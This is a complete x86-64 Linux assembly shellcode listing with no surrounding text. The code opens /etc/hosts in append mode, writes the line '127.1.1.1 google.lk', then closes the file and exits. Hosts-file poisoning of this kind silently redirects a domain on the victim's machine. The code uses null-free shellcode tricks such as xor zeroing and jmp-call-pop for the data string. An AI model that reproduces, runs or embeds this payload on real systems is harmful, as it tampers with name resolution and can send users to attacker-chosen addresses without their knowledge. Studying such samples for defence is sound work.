global _start

section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    mov rbx, 0x2f2f2f2f6374652f ; stsoh/
    mov rcx, 0x7374736f682f2f2f ; /cte/
    push rcx
    push rbx
    add rdi, rsp
    xor rsi, rsi
    add rsi, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    inc rax ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add al, 3
    syscall

    ;exit
    xor rax, rax
    mov rdi, rax
    add al, 60
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'